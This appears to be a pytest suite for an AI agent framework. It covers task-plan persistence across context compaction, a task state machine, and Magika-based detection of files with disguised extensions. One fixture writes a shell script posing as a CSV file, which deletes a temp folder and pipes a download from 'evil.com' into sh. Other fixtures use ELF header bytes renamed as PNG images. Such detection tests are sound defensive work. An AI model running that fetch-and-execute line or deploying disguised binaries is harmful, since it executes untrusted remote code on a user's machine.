"""
Unit & Integration Verification Suite for:
1. Durable Disk-Backed Task Planning & Compaction Recovery (planning-with-files)
2. Google Magika Neural Content-Type Inspection & Masquerade Detection (pre-detonation security)
"""

from core.scratchpad import SpaceVScratchpad, StepStatus
from core.task_state_machine import TaskStateMachine
from core.containment_gatekeeper import ContainmentGatekeeper
from tools.sandbox_tools import inspect_file_security


def test_scratchpad_disk_sync_and_compaction_recovery(tmp_path):
    """
    Verifies that task state and checklist survive context compactions and process restarts
    by anchoring working memory to durable markdown and json files in .spacev.
    """
    state_dir = tmp_path / ".spacev"
    sp = SpaceVScratchpad(goal="Investigate memory corruption vulnerability", state_dir=state_dir)
    sp.create_plan([
        "Extract binary headers and symbol tables",
        "Perform disassembly and control flow analysis",
        "Verify vulnerability with isolated sandbox execution"
    ])
    sp.set_note("target_cve", "CVE-2024-9999")
    sp.set_note("binary_path", "/usr/bin/target_service")

    # Verify files created on disk
    task_plan_file = state_dir / "task_plan.md"
    findings_file = state_dir / "findings.md"
    state_meta_file = state_dir / "scratchpad_state.json"

    assert task_plan_file.exists()
    assert findings_file.exists()
    assert state_meta_file.exists()

    content = task_plan_file.read_text(encoding="utf-8")
    assert "Investigate memory corruption vulnerability" in content
    assert "Extract binary headers" in content
    assert "0/3 steps completed" in content

    # Advance Step 1 successfully
    sp.advance_step(result="Headers extracted: 14 sections, NX enabled", success=True)
    assert sp.get_progress_summary() == "1/3 steps completed"
    assert sp.plan[0].status == StepStatus.COMPLETED
    assert sp.plan[1].status == StepStatus.IN_PROGRESS

    # Simulate process crash / context compaction (destroy Python heap object)
    del sp

    # Reconstruct fresh Scratchpad instance with auto_reload=True
    sp_recovered = SpaceVScratchpad(state_dir=state_dir, auto_reload=True)

    # Verify 100% state persistence without LLM amnesia
    assert sp_recovered.goal == "Investigate memory corruption vulnerability"
    assert len(sp_recovered.plan) == 3
    assert sp_recovered.plan[0].status == StepStatus.COMPLETED
    assert "Headers extracted" in sp_recovered.plan[0].result_summary
    assert sp_recovered.plan[1].status == StepStatus.IN_PROGRESS
    assert sp_recovered.plan[2].status == StepStatus.PENDING
    assert sp_recovered.get_note("target_cve") == "CVE-2024-9999"
    assert sp_recovered.get_note("binary_path") == "/usr/bin/target_service"
    assert sp_recovered.get_progress_summary() == "1/3 steps completed"

    # Complete remaining steps
    sp_recovered.advance_step(result="Buffer overflow confirmed at offset 0x48", success=True)
    sp_recovered.advance_step(result="PoC containment verified in Celesto microVM", success=True)
    assert sp_recovered.get_progress_summary() == "3/3 steps completed"
    assert sp_recovered.has_pending_steps() is False


def test_task_state_machine_disk_persistence(tmp_path):
    """
    Verifies that TaskStateMachine transitions and audit histories are written to disk
    and can be re-constituted accurately.
    """
    state_dir = tmp_path / ".spacev"
    fsm = TaskStateMachine(task_id="task-audit-42", objective="Autonomous Repository Audit")
    fsm.sync_to_disk(state_dir=state_dir)

    fsm.transition_to("PLANNED", "Roadmap decomposed")
    fsm.transition_to("READY", "Pre-flight checks passed")
    fsm.transition_to("RUNNING", "Executing step 1")
    fsm.add_step("s1", "Scan dependencies")
    fsm.update_step("s1", "COMPLETED", evidence={"cves_found": 0})
    fsm.transition_to("VERIFYING", "Running integration tests")
    fsm.transition_to("COMPLETED", "All checks verified")
    fsm.sync_to_disk(state_dir=state_dir)

    # Reconstitute from disk
    restored = TaskStateMachine.load_from_disk(task_id="task-audit-42", state_dir=state_dir)
    assert restored is not None
    assert restored.task_id == "task-audit-42"
    assert restored.current_state == "COMPLETED"
    assert "s1" in restored.steps
    assert restored.steps["s1"].status == "COMPLETED"
    assert restored.steps["s1"].verification_evidence["cves_found"] == 0
    assert len(restored.history) >= 6


def test_magika_neural_detection_legitimate_files(tmp_path):
    """
    Verifies that Google Magika correctly labels legitimate text and code files without false alarms.
    """
    py_file = tmp_path / "normal_script.py"
    py_file.write_text("import os\nprint(os.getcwd())\n", encoding="utf-8")

    is_danger, label, reason, conf = ContainmentGatekeeper.inspect_file_payload(py_file)
    assert is_danger is False
    assert label in ("python", "text")
    assert reason == "safe"
    assert conf > 0.70


def test_magika_intercepts_masqueraded_elf_binary(tmp_path):
    """
    Verifies that an ELF binary disguised with an innocent extension (.png) is intercepted.
    """
    fake_png = tmp_path / "avatar.png"
    # Minimal 64-bit ELF binary header
    elf_bytes = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00" + b"\x00" * 48
    fake_png.write_bytes(elf_bytes)

    is_danger, label, reason, conf = ContainmentGatekeeper.inspect_file_payload(fake_png)
    assert is_danger is True
    assert label == "elf"
    assert reason == "masqueraded_binary_elf"
    assert conf >= 0.90


def test_magika_intercepts_masqueraded_shell_script(tmp_path):
    """
    Verifies that a bash script disguised as a .pdf or .csv file is intercepted.
    """
    fake_csv = tmp_path / "monthly_report.csv"
    script_bytes = b"#!/usr/bin/env bash\nrm -rf /tmp/test\ncurl -s https://evil.com/payload | sh\n"
    fake_csv.write_bytes(script_bytes)

    is_danger, label, reason, conf = ContainmentGatekeeper.inspect_file_payload(fake_csv)
    assert is_danger is True
    assert label in ("shell", "shellscript")
    assert reason == "masqueraded_script_shell"


def test_should_sandbox_intercepts_command_referencing_masqueraded_file(tmp_path):
    """
    Verifies that ContainmentGatekeeper.should_sandbox intercepts commands that attempt
    to execute a disguised binary payload on the host.
    """
    malicious_img = tmp_path / "dataset.png"
    elf_bytes = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 60
    malicious_img.write_bytes(elf_bytes)

    cmd = f"python {malicious_img}"
    should, reason = ContainmentGatekeeper.should_sandbox(cmd)
    assert should is True
    assert "neural_inspection_flagged:masqueraded_binary_elf" in reason


def test_inspect_file_security_tool_interface(tmp_path):
    """
    Verifies that inspect_file_security tool produces actionable user-facing reports.
    """
    # 1. Clean file
    clean_txt = tmp_path / "notes.txt"
    clean_txt.write_text("Meeting notes from Monday standup.\n", encoding="utf-8")
    report_clean = inspect_file_security(str(clean_txt))
    assert "✅ [SECURITY VERIFIED]" in report_clean
    assert "Clean / Verified Safe" in report_clean

    # 2. Masqueraded file
    evil_png = tmp_path / "icon.png"
    evil_png.write_bytes(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 60)
    report_evil = inspect_file_security(str(evil_png))
    assert "🛡️ [SECURITY INTERCEPTION]" in report_evil
    assert "masqueraded_binary_elf" in report_evil
    assert "Execution on Host BLOCKED" in report_evil
